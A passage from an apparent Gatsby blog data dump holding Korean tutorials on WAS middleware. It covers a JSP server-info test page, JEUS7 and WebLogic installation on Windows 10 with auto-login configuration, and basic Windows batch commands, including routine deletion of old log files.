&quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\t// host name\r\n\t\tString hostname = Address.getHostName();\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#F8E0E6\\&quot;&gt;Host Name&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + hostname + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tables&gt;&quot;);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t\r\n\t\tout.println(&quot;&lt;table border=\\&quot;0\\&quot; cellpadding=\\&quot;2\\&quot;&quot;);\r\n\t\tURL url = application.getResource(&quot;/test.jsp&quot;);\r\n\t\t// jsp path\r\n\t\tString jsppath = url.getPath();\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#F2E0F7\\&quot;&gt;JSP Path&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + jsppath + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\t// WAS info\r\n\t\tString wasinfo = application.getServerInfo();\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#F2E0F7\\&quot;&gt;WAS&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + wasinfo + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\t// servlet,jsp version\r\n\t\tString jspv = application.getMajorVersion() + &quot;.&quot; + application.getMinorVersion();\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#F2E0F7\\&quot;&gt;Servlet/JSP version&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + jspv + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tables&gt;&quot;);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t\t\r\n\t\tout.println(&quot;&lt;table border=\\&quot;0\\&quot; cellpadding=\\&quot;2\\&quot;&quot;);\r\n\t\t// date,time\r\n\t\tSimpleDateFormat dtformat = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);\r\n\t\tString datetime = dtformat.format(new java.util.Date());\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#E0F2F7\\&quot;&gt;Current DateTime&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + datetime + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\t// session id\r\n\t\tout.println(&quot;&lt;tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td bgcolor=\\&quot;#E0F2F7\\&quot;&gt;Session ID&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;td&gt;&quot; + session.getId() + &quot;&lt;/td&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tr&gt;&quot;);\r\n\t\tout.println(&quot;&lt;/tables&gt;&quot;);\r\n\t\tout.println(&quot;&lt;br&gt;&quot;);\r\n\t%&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre></div>\n<p><img src=\"./images/5.PNG\" alt=\"test.jsp tableversion view\"></p>\n<p>이제 WEB-INF에 web.xml까지 생성해주면 완성이다.\r\n프로젝트를 우클릭하고 아래와 같이 만들어 줄 수 있다.</p>\n<p><img src=\"./images/6.PNG\" alt=\"make web.xml\"></p>\n<p>기본적으로 생성되는 web.xml이다.</p>\n<p><img src=\"./images/7.PNG\" alt=\"web.xml\"></p>\n<p>이를 webtest에 알맞게 수정해준다.</p>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>web-app</span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://java.sun.com/xml/ns/javaee<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>3.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\r\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>display-name</span><span class=\"token punctuation\">></span></span>webtest<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>display-name</span><span class=\"token punctuation\">></span></span>\r\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>welcome-file-list</span><span class=\"token punctuation\">></span></span>\r\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>welcome-file</span><span class=\"token punctuation\">></span></span>test.jsp<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>welcome-file</span><span class=\"token punctuation\">></span></span>\r\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>welcome-file-list</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>web-app</span><span class=\"token punctuation\">></span></span></code></pre></div>","categories":["misc"],"date":"November 19, 2019","description":null,"id":"eeba49d4-f8e2-591c-abc3-579c8ee953de","keywords":["was","middleware","java","jsp"],"slug":"/WAS-test-web-application/","title":"WAS 테스트용 웹 어플리케이션 만들기","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<h1>설치</h1>\n<p>JEUS7을 다운로드 받기 위해 Tmax technet에 접속한다.</p>\n<p><a href=\"https://technet.tmaxsoft.com/ko/front/main/main.do\">Tmax_Technet</a></p>\n<p><img src=\"./images/0.PNG\" alt=\"JEUS7 download\"></p>\n<p>가입 후 JEUS7 Fix#5를 다운받았다.</p>\n<p><img src=\"./images/1.PNG\" alt=\"JEUS7 download\"></p>\n<p>다운로드를 받으면 이런 창이 뜬다.</p>\n<p><img src=\"./images/2.PNG\" alt=\"JEUS7 download\"></p>\n<p>라이센스 동의</p>\n<p><img src=\"./images/3.PNG\" alt=\"JEUS7 download\"></p>\n<p>커널 비트 설정</p>\n<p><img src=\"./images/4.PNG\" alt=\"JEUS7 download\"></p>\n<p>경로 설정</p>\n<p><img src=\"./images/5.PNG\" alt=\"JEUS7 download\"></p>\n<p>Admin Server가 먼저 있어야 하므로 Domain Admin Server를 선택한다.</p>\n<p><img src=\"./images/6.PNG\" alt=\"JEUS7 download\"></p>\n<p>그러면 이런 창이 뜨는데</p>\n<p><img src=\"./images/7.PNG\" alt=\"JEUS7 download\"></p>\n<p>WebLogic의 경우와 같이 Production 모드를 선택한다.</p>\n<p>Java Path를 지정해준다. 나는 WAS 전용 Java를 D드라이브에 따로 설치했기 때문에\r\nD드라이브에 따로 설정한 Java path를 지정해 주었다.</p>\n<p><img src=\"./images/8.PNG\" alt=\"JEUS7 download\"></p>\n<p>이후 아래와 같은 창이 뜬다.</p>\n<p><img src=\"./images/9.PNG\" alt=\"JEUS7 download\"></p>\n<p>윈도우 서비스로 JEUS를 등록할 수 있다.\r\n윈도우 서비스로 등록하게 되면 기기를 부팅할 때 자동으로 시작하게 할 수 있다.</p>\n<p>우선 NO를 선택한 후, 따로 서비스를 등록하는 방법을 아래에 기술할 것이다.</p>\n<p>비밀번호 지정</p>\n<p><img src=\"./images/10.PNG\" alt=\"JEUS7 download\"></p>\n<p>도메인 이름을 정해준다.</p>\n<p><img src=\"./images/11.PNG\" alt=\"JEUS7 download\"></p>\n<p>Summary를 확인한 후 Install을 진행한다.</p>\n<p><img src=\"./images/12.PNG\" alt=\"JEUS7 download\"></p>\n<p><img src=\"./images/13.PNG\" alt=\"JEUS7 download\"></p>\n<p>끝</p>\n<p><img src=\"./images/14.PNG\" alt=\"JEUS7 download\"></p>\n<h1>서버 설정 커스터마이징</h1>\n<h2>Domain 설정 바꾸기</h2>\n<p><code class=\"language-text\">%JEUS_HOME%\\domains\\[Domain name]\\config\\domain.xml</code></p>\n<p>초기에 webadmin 포트를 default포트가 아닌 값으로 변경하고자 할때 설정한다.</p>\n<p>xml파일 내에서 다음과 같은 부분을 찾아보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>server</span><span class=\"token punctuation\">></span></span>\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">></span></span>adminServer<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">></span></span>\r\n\t...\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>base</span><span class=\"token punctuation\">></span></span>BASE<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>base</span><span class=\"token punctuation\">></span></span>\r\n\t...\r\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>listen-port</span><span class=\"token punctuation\">></span></span>9736<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>listen-port</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>server</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>listen-port를 바꿔주면 변경된다.</p>\n<h2>JEUS launcher 로그 경로</h2>\n<p><code class=\"language-text\">%JEUS_HOME%/bin/jeus.properties.cmd</code>에 SET \tJAVA_ARGS 값을 변경한다.</p>\n<p>[예시 추가]</p>\n<h2>패스워드를 드러내지 않는 자동로그인을 위한 설정</h2>\n<ol>\n<li>\n<p><code class=\"language-text\">%JEUS_HOME%/bin/</code>에 <code class=\"language-text\">jeusEncode</code>를 생성한다.</p>\n</li>\n<li>\n<p>cmd에서 아래와 같이 실행한다.</p>\n</li>\n</ol>\n<p>webadmin 접속 기본포트를 변경했다면 유의해서 작성한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">cd %JEUS_HOME%\\bin\r\nencryprion AES \"[id]:[password]\"</code></pre></div>\n<ol start=\"3\">\n<li>생성한 jeusEncode에 다음과 같이 작성한다.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[domain name]:adminServer [2의 결과물]\r\n%COMPUTERNAME%:[9736 또는 변경한 listen-port] [2의 결과물]</code></pre></div>\n<p>[작성중]</p>\n<!--\r\n## Node Manager 설정 바꾸기\r\n\r\n`%JEUS_HOME%\\nodemanager\\jeusnm.xml`\r\n\r\nNode Manager 포트 변경, 전용 로그파일 경로 등을 변경할 수 있다.\r\n\r\n\r\n\r\n\r\n## administrator 이름 바꾸기\r\n\r\n\r\n\r\n## 보안 설정 바꾸기\r\n\r\n## 기타 로그 위치 바꾸기\r\n\r\n\r\n![](./images/10.PNG)\r\n![](./images/10.PNG)\r\n![](./images/10.PNG)\r\n![](./images/10.PNG)\r\n![](./images/10.PNG)\r\n![](./images/20.PNG)\r\n![](./images/20.PNG)\r\n![](./images/20.PNG)\r\n![](./images/20.PNG)\r\n![](./images/20.PNG)\r\n-->","categories":["misc","setting"],"date":"November 19, 2019","description":null,"id":"d62aec66-b42d-5b32-946a-831437e51b41","keywords":["was","jeus7","jeus","tmax","middleware"],"slug":"/Windows10-JEUS7/","title":"Windows 10에서 JEUS7 설치하기","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>자주 쓰이는 Batch shell 키워드 리스트:</p>\n<ul>\n<li>@ECHO off</li>\n<li>title</li>\n<li>set</li>\n<li>@REM</li>\n<li>%[SOMEVAR]%</li>\n<li>2>&#x26;1</li>\n<li>start</li>\n<li>move</li>\n<li>각종 strip</li>\n</ul>\n<h3>@ECHO off</h3>\n<p>명령어의 복창을 방지한다. 배치파일 내에 여러가지 명령어들을 저장해 두었을 시, 그 명령어들의 결과만을 출력한다.</p>\n<h3>title</h3>\n<p>배치파일이 실행되는 cmd 창의 제목을 지정한다.</p>\n<h3>@REM</h3>\n<p>주석 처리. C계열 언어의 '//'나 파이썬의 '#'에 준함</p>\n<h3>set</h3>\n<p>변수 설정.\r\nex) set VAR=15</p>\n<h3>%[SOMEVAR]%</h3>\n<p>환경변수 또는 현재 batch파일 내에서 지정한 변수 불러오기</p>\n<h3>2>&#x26;1</h3>\n<p>2는 stderr, 1은 stdout이다. standard error를 standard output으로 돌리는 것.</p>\n<h3>start</h3>\n<p>실행파일 실행.\r\n자주쓰는 옵션 \\b: 새 Window에서 실행하지 않고 현재 Window에서 바로 실행</p>\n<h3>move</h3>\n<p>파일 이동 또는 파일이름 변경\r\nmove [원본] [변경후]</p>\n<h3>각종 strip</h3>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">ECHO</span> OFF</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%DATE%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">move</span> log.txt log<span class=\"token variable\">%PREFIX%</span>.txt</span></code></pre></div>\n<p><img src=\"./images/0.PNG\" alt=\"cmd batch 0\"></p>\n<p><img src=\"./images/1.PNG\" alt=\"logfile1\"></p>\n<p>:~[number]\r\n[number]~끝까지를 지정한다.\r\n이미 생성해 놓은 log.txt파일의 이름을 변경하는 것으로 실험하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">ECHO</span> OFF</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%DATE%</span></span>\r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> move log.txt log<span class=\"token variable\">%PREFIX%</span>.txt</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX2</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:~2%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">move</span> log<span class=\"token variable\">%PREFIX%</span>.txt log<span class=\"token variable\">%PREFIX2%</span>.txt</span></code></pre></div>\n<p><img src=\"./images/2.PNG\" alt=\"logfile2\"></p>\n<p>\"2019-11-18\"이라는 문자열의 index가 2인 자리부터 끝까지 지정되어 19-11-18이 된 것을 볼 수 있다.</p>\n<p>:[]=\r\n[]자리에 해당하는 문자열을 잘라낸다.</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">ECHO</span> OFF</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%DATE%</span></span>\r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> move log.txt log<span class=\"token variable\">%PREFIX%</span>.txt</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX2</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:~2%</span></span>\r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> move log<span class=\"token variable\">%PREFIX%</span>.txt log<span class=\"token variable\">%PREFIX2%</span>.txt</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX3</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX2:</span><span class=\"token operator\">-=</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">move</span> log<span class=\"token variable\">%PREFIX2%</span>.txt log<span class=\"token variable\">%PREFIX3%</span>.txt</span></code></pre></div>\n<p><img src=\"./images/3.PNG\" alt=\"logfile3\"></p>\n<p>\"19-11-18\"에서 -가 사라진 191118이 된 것을 볼 수 있다.</p>\n<p>기타 cmd창 커스터마이즈</p>\n<ul>\n<li>color</li>\n<li>mode con cols=[] lines=[]</li>\n</ul>\n<h3>color</h3>\n<p>color [1][2]\r\n[1]은 배경색, [2]는 글씨색이다.</p>\n<table>\n<thead>\n<tr>\n<th>Code</th>\n<th>Color</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>Black</td>\n</tr>\n<tr>\n<td>8</td>\n<td>Gray</td>\n</tr>\n<tr>\n<td>1</td>\n<td>Blue</td>\n</tr>\n<tr>\n<td>9</td>\n<td>Light Blue</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Green</td>\n</tr>\n<tr>\n<td>A</td>\n<td>Light Green</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Aqua</td>\n</tr>\n<tr>\n<td>B</td>\n<td>Light Aqua</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Red</td>\n</tr>\n<tr>\n<td>C</td>\n<td>Light Red</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Purple</td>\n</tr>\n<tr>\n<td>D</td>\n<td>Light Purple</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Yellow</td>\n</tr>\n<tr>\n<td>E</td>\n<td>Light Yellow</td>\n</tr>\n<tr>\n<td>7</td>\n<td>White</td>\n</tr>\n<tr>\n<td>F</td>\n<td>Bright White</td>\n</tr>\n</tbody>\n</table>\n<h3>mode con cols=[] lines=[]</h3>\n<p>창 크기를 조절하는 명령어이다.\r\nmode con cols=[가로크기] lines=[세로크기]</p>\n<p>참고한 곳: <a href=\"https://ss64.com/nt/\">https://ss64.com/nt/</a></p>\n<h2>자주 쓰는 조합</h2>\n<h3>주기적인 로그삭제</h3>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token command\"><span class=\"token keyword\">forfiles</span> <span class=\"token parameter attr-name\">/p</span> <span class=\"token string\">\"[path]\"</span> <span class=\"token parameter attr-name\">/s</span> <span class=\"token parameter attr-name\">/m</span> [words to search] <span class=\"token parameter attr-name\">/d</span> -[date] <span class=\"token parameter attr-name\">/c</span> <span class=\"token string\">\"cmd /c del @path\"</span></span></code></pre></div>\n<table>\n<thead>\n<tr>\n<th>Option</th>\n<th>description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>/p</td>\n<td>path</td>\n</tr>\n<tr>\n<td>/s</td>\n<td>search including subdirectories</td>\n</tr>\n<tr>\n<td>/m</td>\n<td>search specific words</td>\n</tr>\n<tr>\n<td>/d</td>\n<td>date</td>\n</tr>\n<tr>\n<td>/c</td>\n<td>command</td>\n</tr>\n</tbody>\n</table>\n<p>ex)</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token command\"><span class=\"token keyword\">forfiles</span> <span class=\"token parameter attr-name\">/p</span> <span class=\"token string\">\"C:\\Temp\\\" /s /m *.log /d -10 /c \"</span>cmd <span class=\"token parameter attr-name\">/c</span> del @path</span>\"</code></pre></div>\n<p>의미: C:\\Temp부터 하위 디렉토리 전부를 대상으로, 파일명이 *.log이며 생성된지 10일이 넘은 파일들을 모두 삭제한다.</p>","categories":["misc","setting"],"date":"November 14, 2019","description":null,"id":"6d57910f-892f-552e-b897-234e82078595","keywords":["windows","cmd","batchfile","script"],"slug":"/Windows-Batch-file/","title":"Windows Batch file 만들기","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>환경:\r\nWindows 10\r\nWAS 환경을 D드라이브에 별도로 구성하고자 함</p>\n<p>선수 요구사항:\r\nOracle 계정\r\nJava HotSpot(TM) 1.8.0_221\r\n나는 D드라이브에 있는 WAS만을 위한 Java를 따로 설치하였다.</p>\n<h1>설치파일 다운로드</h1>\n<p><a href=\"https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html\">Oracle</a>에서 Generic Installer 다운로드</p>\n<p><img src=\"./images/0.PNG\" alt=\"Oracle Weblogic\"></p>\n<p><img src=\"./images/1.PNG\" alt=\"Oracle Weblogic\"></p>\n<p>다음과 같은 압축파일이 다운받아진다</p>\n<p><img src=\"./images/2.PNG\" alt=\"Oracle Weblogic zipfile\"></p>\n<h1>WebLogic 설치</h1>\n<p>아래와 같은 명령어로 jar파일을 실행시킨다.\r\n관리자로 실행</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token command\"><span class=\"token keyword\">java</span> -jar -d64 fmw_12.<span class=\"token number\">2</span>.<span class=\"token number\">1</span>.<span class=\"token number\">4</span>.0_wls.jar</span></code></pre></div>\n<p><img src=\"./images/3.PNG\" alt=\"Oracle Weblogic java jar\"></p>\n<p>아래는 설치 과정.</p>\n<p><img src=\"./images/4.PNG\" alt=\"Oracle Weblogic install 1/8\"></p>\n<p><img src=\"./images/5.PNG\" alt=\"Oracle Weblogic install 2/8\"></p>\n<p>D:\\Oracle\\Middleware\\Oracle_Home 이었던 경로를 아래와 같이 바꾸었다.\r\n어차피 단일 디렉토리임</p>\n<p><img src=\"./images/6.PNG\" alt=\"Oracle Weblogic install 3/8\"></p>\n<p><img src=\"./images/7.PNG\" alt=\"Oracle Weblogic install 4/8\"></p>\n<p><img src=\"./images/8.PNG\" alt=\"Oracle Weblogic install 5/8\"></p>\n<p><img src=\"./images/9.PNG\" alt=\"Oracle Weblogic install 6/8\"></p>\n<p>그대로 설치</p>\n<p><img src=\"./images/10.PNG\" alt=\"Oracle Weblogic install 7/8\"></p>\n<p><img src=\"./images/11.PNG\" alt=\"Oracle Weblogic install 8/8\"></p>\n<h1>도메인 생성 및 Admin Server 생성</h1>\n<p>완료버튼을 누르면 그대로 도메인 생성과 Admin server 생성 과정이 시작된다.\r\n도메인 경로는 기본적으로 D:\\WAS\\WebLogic12.2.1.4.0\\user_projects\\domains\\base_domain라 뜨지만\r\n용도별로 base_domain 이름을 바꿔주는 것이 좋다.\r\n나는 연습용이라 prac으로 명명함</p>\n<p><img src=\"./images/12.PNG\" alt=\"Oracle Weblogic Domain install 1/9\"></p>\n<p><img src=\"./images/13.PNG\" alt=\"Oracle Weblogic Domain install 2/9\"></p>\n<p><img src=\"./images/14.PNG\" alt=\"Oracle Weblogic Domain install 3/9\"></p>\n<p><img src=\"./images/15.PNG\" alt=\"Oracle Weblogic Domain install 4/9\">\r\n운영 목적이기 때문에 운영에 체크하였다. JDK가 다른 드라이브에 잡혀 있다면 새로 위치를 잡아주도록 한다.</p>\n<p><img src=\"./images/16.PNG\" alt=\"Oracle Weblogic Domain install 5/9\">\r\n관리 서버에 체크.</p>\n<p><img src=\"./images/17.PNG\" alt=\"Oracle Weblogic Domain install 6/9\">\r\n수신 포트는 회사마다 바꾸는 곳도 있을 것이니 유의. 나는 연습용이라 그대로</p>\n<p><img src=\"./images/18.PNG\" alt=\"Oracle Weblogic Domain install 7/9\">\r\n그대로 생성한다</p>\n<p><img src=\"./images/19.PNG\" alt=\"Oracle Weblogic Domain install 8/9\"></p>\n<p><img src=\"./images/20.PNG\" alt=\"Oracle Weblogic Domain install 9/9\">\r\n설치가 완료되었다. 관리 서버 URL 잘 봐두기</p>\n<p><a href=\"http://localhost:7001/console\">http://localhost:7001/console</a>\r\nhttp://[host]:[port]/console</p>\n<p>cmd 창에서 접근의 용이함을 위해 환경변수를 추가하였다.</p>\n<p><img src=\"./images/21.PNG\" alt=\"Oracle Weblogic DOMAIN_HOME\"></p>\n<p><img src=\"./images/22.PNG\" alt=\"Oracle Weblogic DOMAIN_HOME\"></p>\n<p>bin에도 명령어가 있지만 DOMAIN_HOME에도 있다. 웹로직 기동을 위해 이것을 실행시킨다.\r\n<img src=\"./images/23.PNG\" alt=\"Oracle Weblogic startWebLogic.cmd1\"></p>\n<p><img src=\"./images/24.PNG\" alt=\"Oracle Weblogic startWebLogic.cmd2\"></p>\n<p>설치 시에 입력했던 username과 패스워드를 입력한다.</p>\n<p>이후 Running이 뜨면 잘 기동이 된 것이다.\r\n<img src=\"./images/25.PNG\" alt=\"Oracle Weblogic startWebLogic.cmd RUNNING\"></p>\n<h1>Managed Server 생성</h1>\n<p>이전에 봐 두었던 콘솔 창 url로 접속한다.\r\nhttp://[host]:[port]/console</p>\n<p><img src=\"./images/26.PNG\" alt=\"Oracle Weblogic console\">\r\n콘솔 창이 정상적으로 뜨면 문제없이 기동된 것. 아까 입력한 username과 패스워드로 로그인한다.</p>\n<p><img src=\"./images/27.PNG\" alt=\"Oracle Weblogic console\">\r\n환경 > 서버로 들어간다.</p>\n<p><img src=\"./images/28.PNG\" alt=\"Oracle Weblogic console\">\r\n잠금 및 편집으로 lock을 풀어준다.</p>\n<p><img src=\"./images/29.PNG\" alt=\"Oracle Weblogic console\">\r\n새로 만들기</p>\n<p><img src=\"./images/30.PNG\" alt=\"Oracle Weblogic console\">\r\n매니지드 서버를 이와 같은 조건으로 생성하였다.</p>\n<p><img src=\"./images/31.PNG\" alt=\"Oracle Weblogic console\">\r\n변경 내용 활성화를 눌러준다.</p>\n<p>매니지드 서버가 생성되었지만 기동되지 않은 상태이다.\r\n%DOMAIN_HOME%\\bin에서 다음과 같은 명령어를 실행시켜 준다.</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token command\"><span class=\"token keyword\">startManagedWebLogic</span>.cmd [Managed Server Name] t3://[AdminServer Host]:[AdminServer Port]</span></code></pre></div>\n<p><img src=\"./images/32.PNG\" alt=\"Oracle Weblogic startManagedWebLogic.cmd\"></p>\n<p>startWebLogic.cmd때 처럼 username과 password를 입력해 준다.</p>\n<p><img src=\"./images/33.PNG\" alt=\"Oracle Weblogic startManagedWebLogic.cmd Login\"></p>\n<p><img src=\"./images/34.PNG\" alt=\"Oracle Weblogic startManagedWebLogic.cmd RUNNING\"></p>\n<p>위와 같이 RUNNING이 뜨고</p>\n<p><img src=\"./images/35.PNG\" alt=\"Oracle Weblogic console\">\r\nManaged01 서버의 상태가 RUNNING으로 바뀐 것을 볼 수 있다.</p>\n<h1>WebLogic 구동시 자동 로그인을 위한 boot.properties 생성</h1>\n<p>startWebLogic.cmd로 웹로직을 실행시킬 때마다 일일히 로그인을 해야 한다.\r\n이를 %DOMAIN_HOME%/servers/[adminserver]/security/boot.properties를 생성하여 자동 로그인을 하게 할 수 있다.</p>\n<p>%DOMAIN_HOME%/servers/[adminserver]에 본래 security 디렉토리는 없다. 이를 만들어 준 후 boot.properties를 아래와 같이 작성한다.</p>\n<p><img src=\"./images/36.PNG\" alt=\"boot.properties\"></p>\n<p>= 뒤에 본인이 설정했던 username과 패스워드를 입력한다. 일단 평문으로 저장해 주면, 이후에 웹로직을 기동할 때 암호화된다.\r\nboot.properties를 저장한 후 startWebLogic.cmd로 웹로직을 재기동시키면 username과 패스워드를 요구하지 않고 RUNNING이 뜨는 것을 볼 수 있다.\r\n재기동 후 boot.properties를 열어보면 암호화가 되어 저장되어진 것을 볼 수 있다.</p>\n<p><img src=\"./images/37.PNG\" alt=\"encrypted boot.properties\"></p>\n<p>%DOMAIN_HOME%/servers/[managedserver]에도 같은 식으로 생성해 준다.</p>\n<h1>편의를 위한 실행 배치파일 생성 + 배치파일 기본 작성법 작성 후 링크걸기</h1>\n<p><a href=\"https://s01va.github.io/Windows-Batch-file-%EB%A7%8C%EB%93%A4%EA%B8%B0/\">배치파일 만들기</a></p>\n<p>아래와 같이 두 스크립트를 만들었다.</p>\n<p>Admin Server 구동 스크립트</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">ECHO</span> OFF</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">SERVER_NAME</span><span class=\"token operator\">=</span>AdminServer</span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">title</span> WebLogic_<span class=\"token variable\">%SERVER_NAME%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">DOMAIN_HOME</span><span class=\"token 